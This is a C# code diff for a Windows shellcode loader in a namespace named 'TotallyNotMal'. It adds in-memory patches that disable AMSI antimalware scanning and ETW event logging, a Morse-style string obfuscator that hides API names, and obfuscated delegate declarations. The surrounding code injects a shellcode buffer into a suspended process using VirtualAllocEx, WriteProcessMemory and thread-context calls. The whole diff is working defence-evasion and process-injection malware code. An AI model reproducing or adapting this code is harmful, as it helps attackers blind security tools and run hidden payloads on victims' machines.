@@ -89,10 +89,78 @@ namespace TotallyNotMal
             return decryptedData;
         }
 
+        private static bool is64Bit()
+        {
+            if (IntPtr.Size == 4)
+                return false;
+
+            return true;
+        }
+
+        private static byte[] getAMSIPayload()
+        {
+            if (!is64Bit())
+                return Convert.FromBase64String("uFcAB4DCGAA=");
+            return Convert.FromBase64String("uFcAB4DD");
+        }
+
+        private static byte[] getETWPayload()
+        {
+            if (!is64Bit())
+                return Convert.FromBase64String("whQA");
+            return Convert.FromBase64String("ww==");
+        }
+
+        //code stolen from https://github.com/Flangvik/NetLoader/blob/master/Source/Program.cs
+        private static void PatchAMSI()
+        {
+
+            IntPtr pGetProcAddress = KecilSaja.GetLibraryAddress("kernel32.dll", "GetProcAddress");
+            IntPtr pLoadLibrary = KecilSaja.GetLibraryAddress("kernel32.dll", "LoadLibraryA");
+            IntPtr pVirtualProtect = KecilSaja.GetLibraryAddress("kernel32.dll", "VirtualProtect");
+            DELEGATES.VirtualProtect fVirtualProtect = (DELEGATES.VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(DELEGATES.VirtualProtect));
+            IntPtr pASB = KecilSaja.GetLibraryAddress(rahsia(".- -- ... .. ^^^.__- -.. .-.. .-.."), rahsia("^.- -- ... .. ^... -.-. .- -. ^-... ..- ..-. ..-. . .-."));
+
+            var patch = getAMSIPayload();
+            uint oldProtect;
+
+            if (fVirtualProtect(pASB, (UIntPtr)patch.Length, 0x40, out oldProtect))
+            {
+                Marshal.Copy(patch, 0, pASB, patch.Length);
+                Console.WriteLine("[+] Successfully patched AMSI!");
+            }
+            else
+            {
+                Console.WriteLine("[!] Patching AMSI FAILED");
+            }
+
+        }
+
+        //code stolen from https://github.com/Flangvik/NetLoader/blob/master/Source/Program.cs
+        private static void PatchETW()
+        {
+            IntPtr pEtwEventSend = KecilSaja.GetLibraryAddress("ntdll.dll", "EtwEventWrite");
+            IntPtr pVirtualProtect = KecilSaja.GetLibraryAddress("kernel32.dll", "VirtualProtect");
+
+            DELEGATES.VirtualProtect fVirtualProtect = (DELEGATES.VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(DELEGATES.VirtualProtect));
+
+            var patch = getETWPayload();
+            uint oldProtect;
+
+            if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
+            {
+                Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
+                Console.WriteLine("[+] Successfully unhooked ETW!");
+                fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+            }
+
+
+        }
+
         public static string rahsia(string encoded)
         {
-            char[] text = { 'a', 'A', 'b', 'B', 'c', 'C', 'd', 'D', 'e', 'E', 'f', 'F', 'g', 'G', 'h', 'H', 'i', 'I', 'j', 'J', 'k', 'K', 'l', 'L', 'm', 'M', 'n', 'N', 'o', 'O', 'p', 'P', 'q', 'Q', 'r', 'R', 's', 'S', 't', 'T', 'u', 'U', 'v', 'V', 'w', 'W', 'x', 'X', 'y', 'Y', 'z', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '/', '=', '+', '!' };
-            string[] titik = { ".-", "^.-", "-...", "^-...", "-.-.", "^-.-.", "-..", "^-..", ".", "^.", "..-.", "^..-.", "--.", "^--.", "....", "^....", "..", "^..", ".---", "^.---", "-.-", "^-.-", ".-..", "^.-..", "--", "^--", "-.", "^-.", "---", "^---", ".--.", "^.--.", "--.-", "^--.-", ".-.", "^.-.", "...", "^...", "-", "^-", "..-", "^..-", "...-", "^...-", ".--", "^.--", "-..-", "^-..-", "-.--", "^-.--", "--..", "^--..", "-----", ".----", "..---", "...--", "....-", ".....", "-....", "--...", "---..", "----.", "/", "...^-", "^.^", "^..^" };
+            char[] text = { 'a', 'A', 'b', 'B', 'c', 'C', 'd', 'D', 'e', 'E', 'f', 'F', 'g', 'G', 'h', 'H', 'i', 'I', 'j', 'J', 'k', 'K', 'l', 'L', 'm', 'M', 'n', 'N', 'o', 'O', 'p', 'P', 'q', 'Q', 'r', 'R', 's', 'S', 't', 'T', 'u', 'U', 'v', 'V', 'w', 'W', 'x', 'X', 'y', 'Y', 'z', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '/', '=', '+', '!', '.' };
+            string[] titik = { ".-", "^.-", "-...", "^-...", "-.-.", "^-.-.", "-..", "^-..", ".", "^.", "..-.", "^..-.", "--.", "^--.", "....", "^....", "..", "^..", ".---", "^.---", "-.-", "^-.-", ".-..", "^.-..", "--", "^--", "-.", "^-.", "---", "^---", ".--.", "^.--.", "--.-", "^--.-", ".-.", "^.-.", "...", "^...", "-", "^-", "..-", "^..-", "...-", "^...-", ".--", "^.--", "-..-", "^-..-", "-.--", "^-.--", "--..", "^--..", "-----", ".----", "..---", "...--", "....-", ".....", "-....", "--...", "---..", "----.", "/", "...^-", "^.^", "^..^", "^^^.__-" };
             string[] codes = encoded.Split(' ');
 
             StringBuilder decoded = new StringBuilder();
@@ -133,28 +201,26 @@ namespace TotallyNotMal
             STRUCTS.STARTUPINFO si = new STRUCTS.STARTUPINFO();
             STRUCTS.PROCESS_INFORMATION pi = new STRUCTS.PROCESS_INFORMATION();
 
+            //PatchAMSI();
+            PatchETW();
+
             IntPtr pointer = KecilSaja.GetLibraryAddress("kernel32.dll", "CreateProcessA");
             DELEGATES.CreateProcess createProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.CreateProcess)) as DELEGATES.CreateProcess;
             bool success = createProcess(processPath, null, IntPtr.Zero, IntPtr.Zero, false, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
 
-
-
             pointer = KecilSaja.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
             DELEGATES.VirtualAllocEx virtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx;
             IntPtr alloc = virtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sh3Llc0d3.Length, 0x1000 | 0x2000, 0x40);
-
 
             pointer = KecilSaja.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
             DELEGATES.WriteProcessMemory writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.WriteProcessMemory)) as DELEGATES.WriteProcessMemory;
             UIntPtr bytesWritten;
             writeProcessMemory(pi.hProcess, alloc, sh3Llc0d3, (uint)sh3Llc0d3.Length, out bytesWritten);
 
-
             pointer = KecilSaja.GetLibraryAddress("kernel32.dll", "OpenThread");
             DELEGATES.OpenThread openThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.OpenThread)) as DELEGATES.OpenThread;
             IntPtr tpointer = openThread(STRUCTS.ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
             uint oldProtect = 0;
-
 
             pointer = KecilSaja.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
             DELEGATES.VirtualProtectEx virtualProtectEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualProtectEx)) as DELEGATES.VirtualProtectEx;
@@ -176,6 +242,11 @@ namespace TotallyNotMal
 
     public class DELEGATES
     {
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr GetProcAddress(IntPtr UrethralgiaOrc, string HypostomousBuried);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr LoadLibrary(string LiodermiaGranulater);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate Boolean CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, STRUCTS.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STRUCTS.STARTUPINFO lpStartupInfo, out STRUCTS.PROCESS_INFORMATION lpProcessInformation);
@@ -189,6 +260,9 @@ namespace TotallyNotMal
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate IntPtr OpenThread(STRUCTS.ThreadAccess dwDesiredAccess, bool bInheritHandle,
         int dwThreadId);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate bool VirtualProtect(IntPtr GhostwritingNard, UIntPtr NontabularlyBankshall, uint YohimbinizationUninscribed, out uint ZygosisCoordination);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate Boolean VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
